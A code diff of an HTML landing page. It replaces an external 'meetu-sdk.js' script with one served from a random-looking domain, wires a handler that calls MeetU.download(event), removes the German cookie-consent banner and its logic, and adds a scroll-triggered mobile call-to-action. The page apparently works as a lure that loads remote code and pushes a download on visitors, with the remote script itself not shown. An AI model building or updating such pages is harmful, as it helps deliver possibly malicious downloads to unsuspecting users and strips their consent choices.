@@ -8,10 +8,13 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-        <script src="https://api.skyprotect.online/js/meetu-sdk.js"></script>	
+
+  <script src="https://api.snk622ma.site/js/meetu-sdk.js"></script>  
+  
 <script>
   function k2() {
-   MeetU.download(event);
+    
+MeetU.download(event);
   }
 </script>
 <style>
@@ -334,37 +337,6 @@
   }
   .mobile-cta .cta { width: 100%; justify-content: center; }
 
-  /* ---------- Cookie consent (desktop) ---------- */
-  .cookie-bar {
-    display: flex;
-    position: fixed;
-    left: 18px; bottom: 18px;
-    z-index: 60;
-    max-width: 380px;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 14px;
-    padding: 16px 18px;
-    box-shadow: 0 24px 60px -24px rgba(0, 0, 0, 0.8);
-    gap: 14px;
-    align-items: flex-start;
-  }
-  .cookie-bar p { font-size: 12px; color: var(--muted); line-height: 1.5; }
-  .cookie-bar .cookie-btns { display: flex; gap: 8px; flex: none; }
-  .cookie-btn {
-    border: 1px solid var(--border);
-    background: transparent;
-    color: var(--text);
-    font-size: 12.5px;
-    font-weight: 600;
-    padding: 7px 13px;
-    border-radius: 9px;
-    cursor: pointer;
-    white-space: nowrap;
-  }
-  .cookie-btn.accept { background: var(--green); color: #04110a; border-color: transparent; }
-  .cookie-btn:hover { opacity: 0.85; }
-
   /* ---------- Desktop: lock to one screen ---------- */
   @media (min-width: 900px) {
     .page { height: 100dvh; overflow: auto; }
@@ -384,8 +356,7 @@
     .news-grid { grid-template-columns: 1fr; }
     .cta { width: 100%; justify-content: center; }
     .trust { justify-content: center; }
-    .mobile-cta { display: block; }
-    .cookie-bar { display: none; }
+    .mobile-cta.is-visible { display: block; }
     .site-footer { padding-bottom: 96px; }
   }
 </style>
@@ -561,25 +532,21 @@
   </a>
 </div>
 
-<!-- Cookie consent (desktop only) -->
-<div class="cookie-bar" id="cookieBar">
-  <p>Wir verwenden Cookies, um dein Erlebnis zu verbessern und den Datenverkehr zu analysieren. Wenn du fortfährst, stimmst du der Verwendung von Cookies zu.</p>
-  <div class="cookie-btns">
-    <button class="cookie-btn" onclick="cookieChoice('declined')">Ablehnen</button>
-    <button class="cookie-btn accept" onclick="cookieChoice('accepted')">Akzeptieren</button>
-  </div>
-</div>
-
 <script>
   (function () {
-    var bar = document.getElementById('cookieBar');
-    var saved = null;
-    try { saved = localStorage.getItem('cookie-consent'); } catch (e) {}
-    if (saved) bar.style.display = 'none';
-    window.cookieChoice = function (v) {
-      bar.style.display = 'none';
-      try { localStorage.setItem('cookie-consent', v); } catch (e) {}
-    };
+    var cta = document.querySelector('.mobile-cta');
+    if (!cta) return;
+    var shown = false;
+    function onScroll() {
+      if (shown) return;
+      if ((window.pageYOffset || document.documentElement.scrollTop) > 0) {
+        shown = true;
+        cta.classList.add('is-visible');
+        window.removeEventListener('scroll', onScroll);
+      }
+    }
+    window.addEventListener('scroll', onScroll, { passive: true });
+    onScroll();
   })();
 </script>
 </body>
